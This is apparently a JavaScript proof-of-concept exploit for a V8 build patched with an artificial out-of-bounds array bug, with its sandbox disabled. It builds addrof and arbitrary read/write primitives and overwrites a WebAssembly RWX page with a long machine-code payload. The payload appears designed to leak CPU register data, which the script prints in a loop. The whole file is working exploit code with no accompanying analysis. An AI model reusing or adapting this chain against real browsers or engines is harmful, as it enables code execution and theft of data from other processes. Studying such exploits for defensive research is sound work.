/*

V8 Source:
  git checkout c74783f8ec53e16a6aec28aef162569ccc75156a
  git apply poc/array_len.diff

Build:
  args.gn - x64.release except for:
    v8_enable_sandbox = false

*/
var bs = new ArrayBuffer(8);
var fs = new Float64Array(bs);
var is = new BigUint64Array(bs);

/* converts a float to a 64-bit uint */
function ftoi(x) {
  fs[0] = x;
  return is[0];
}

/* converts a 64-bit uint to a float */
function itof(x) {
  is[0] = x;
  return fs[0];
}

/* create an oob array */
let oob = [1.1];
oob.len(1337);

/* flt.elements @ oob[6] */
let flt = [1.1];

/* obj.elements @ oob[15] */
let tmp = {a: 1};
let obj = [tmp];

/* addrof primitive */
function addrof(o) {
  oob[6] = oob[15]; 
  obj[0] = o;
  return (ftoi(flt[0]) & 0xffffffffn) - 1n;
}

/* 64-bit read primitive */
function read(p) {
  let a = ftoi(oob[6]) >> 32n;
  oob[6] = itof((a << 32n) + p - 8n + 1n);
  return ftoi(flt[0]);
}

/* 64-bit write primitive */
function write(p, x) {
  let a = ftoi(oob[6]) >> 32n;
  oob[6] = itof((a << 32n) + p - 8n + 1n);
  flt[0] = itof(x);
}


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,134,128,128,128,0,1,96,2,127,127,0,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,102,117,110,99,0,0,10,155,128,128,128,0,1,149,128,128,128,0,0,32,0,32,1,173,55,3,0,32,0,32,1,65,1,106,173,55,3,8,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);

var arr = new Uint8Array(wasmInstance.exports.memory.buffer,0,32);
wasmInstance.exports.func(arr);

var buf = new ArrayBuffer(2048);
var view = new DataView(buf);

var rwx = read(addrof(wasmInstance)+0x50n);
write(addrof(buf)+0x20n,rwx);

var shellcode = new Uint8Array([0x55,0x48,0x89,0xe5,0x68,0x08,0x00,0x00,0x00,0x56,0x48,0x81,0xec,0x10,0x00,0x00,0x00,0x48,0x8b,0x56,0x27,0xc5,0xfc,0x77,0x48,0x31,0xc0,0xc4,0x41,0x05,0xef,0xff,0xc4,0x42,0x7d,0x17,0xff,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0x82,0x2a,0xf8,0xc4,0x41,0x7d,0x10,0xff,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xff,0x74,0x0a,0xc5,0x7d,0x11,0x3c,0x02,0xe9,0xef,0x05,0x00,0x00,0xc4,0x41,0x0d,0xef,0xf6,0xc4,0x42,0x7d,0x17,0xf6,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0x8a,0x2a,0xf0,0xc4,0x41,0x7d,0x10,0xf6,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xf6,0x74,0x0a,0xc5,0x7d,0x11,0x34,0x02,0xe9,0x89,0x05,0x00,0x00,0xc4,0x41,0x15,0xef,0xed,0xc4,0x42,0x7d,0x17,0xed,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0x92,0x2a,0xe8,0xc4,0x41,0x7d,0x10,0xed,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xed,0x74,0x0a,0xc5,0x7d,0x11,0x2c,0x02,0xe9,0x23,0x05,0x00,0x00,0xc4,0x41,0x1d,0xef,0xe4,0xc4,0x42,0x7d,0x17,0xe4,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0x9a,0x2a,0xe0,0xc4,0x41,0x7d,0x10,0xe4,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xe4,0x74,0x0a,0xc5,0x7d,0x11,0x24,0x02,0xe9,0xbd,0x04,0x00,0x00,0xc4,0x41,0x25,0xef,0xdb,0xc4,0x42,0x7d,0x17,0xdb,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0xa2,0x2a,0xd8,0xc4,0x41,0x7d,0x10,0xdb,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xdb,0x74,0x0a,0xc5,0x7d,0x11,0x1c,0x02,0xe9,0x57,0x04,0x00,0x00,0xc4,0x41,0x2d,0xef,0xd2,0xc4,0x42,0x7d,0x17,0xd2,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0xaa,0x2a,0xd0,0xc4,0x41,0x7d,0x10,0xd2,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xd2,0x74,0x0a,0xc5,0x7d,0x11,0x14,0x02,0xe9,0xf1,0x03,0x00,0x00,0xc4,0x41,0x35,0xef,0xc9,0xc4,0x42,0x7d,0x17,0xc9,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0xb2,0x2a,0xc8,0xc4,0x41,0x7d,0x10,0xc9,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xc9,0x74,0x0a,0xc5,0x7d,0x11,0x0c,0x02,0xe9,0x8b,0x03,0x00,0x00,0xc4,0x41,0x3d,0xef,0xc0,0xc4,0x42,0x7d,0x17,0xc0,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0x61,0xba,0x2a,0xc0,0xc4,0x41,0x7d,0x10,0xc0,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0x42,0x7d,0x17,0xc0,0x74,0x0a,0xc5,0x7d,0x11,0x04,0x02,0xe9,0x25,0x03,0x00,0x00,0xc5,0xc5,0xef,0xff,0xc4,0xe2,0x7d,0x17,0xff,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xc2,0x2a,0xf8,0xc5,0xfd,0x10,0xff,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xff,0x74,0x0a,0xc5,0xfd,0x11,0x3c,0x02,0xe9,0xc1,0x02,0x00,0x00,0xc5,0xcd,0xef,0xf6,0xc4,0xe2,0x7d,0x17,0xf6,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xca,0x2a,0xf0,0xc5,0xfd,0x10,0xf6,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xf6,0x74,0x0a,0xc5,0xfd,0x11,0x34,0x02,0xe9,0x5d,0x02,0x00,0x00,0xc5,0xd5,0xef,0xed,0xc4,0xe2,0x7d,0x17,0xed,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xd2,0x2a,0xe8,0xc5,0xfd,0x10,0xed,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xed,0x74,0x0a,0xc5,0xfd,0x11,0x2c,0x02,0xe9,0xf9,0x01,0x00,0x00,0xc5,0xdd,0xef,0xe4,0xc4,0xe2,0x7d,0x17,0xe4,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xda,0x2a,0xe0,0xc5,0xfd,0x10,0xe4,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xe4,0x74,0x0a,0xc5,0xfd,0x11,0x24,0x02,0xe9,0x95,0x01,0x00,0x00,0xc5,0xe5,0xef,0xdb,0xc4,0xe2,0x7d,0x17,0xdb,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xe2,0x2a,0xd8,0xc5,0xfd,0x10,0xdb,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xdb,0x74,0x0a,0xc5,0xfd,0x11,0x1c,0x02,0xe9,0x31,0x01,0x00,0x00,0xc5,0xed,0xef,0xd2,0xc4,0xe2,0x7d,0x17,0xd2,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xea,0x2a,0xd0,0xc5,0xfd,0x10,0xd2,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xd2,0x74,0x0a,0xc5,0xfd,0x11,0x14,0x02,0xe9,0xcd,0x00,0x00,0x00,0xc5,0xf5,0xef,0xc9,0xc4,0xe2,0x7d,0x17,0xc9,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xf2,0x2a,0xc8,0xc5,0xfd,0x10,0xc9,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xc9,0x74,0x0a,0xc5,0xfd,0x11,0x0c,0x02,0xe9,0x69,0x00,0x00,0x00,0xc5,0xfd,0xef,0xc0,0xc4,0xe2,0x7d,0x17,0xc0,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xf3,0x90,0xc4,0xe1,0xfa,0x2a,0xc0,0xc5,0xfd,0x10,0xc0,0x7a,0x05,0x7b,0x03,0xc5,0xf8,0x77,0xc4,0xe2,0x7d,0x17,0xc0,0x74,0x0a,0xc5,0xfd,0x11,0x04,0x02,0xe9,0x05,0x00,0x00,0x00,0xe9,0xab,0xf9,0xff,0xff,0x48,0x89,0xec,0x5d,0xc3]);
for (let i = 0; i < shellcode.length; i++){
    view.setUint8(i, shellcode[i]);
}

console.log("Running PoC...")
const remove_non_ASCII = str => str.replace(/[^\x20-\x7E]/g, '');
while(true){
  wasmInstance.exports.func(arr);
  let str = remove_non_ASCII(String.fromCharCode.apply(null,arr));
  if(str != "") console.log(str);
}
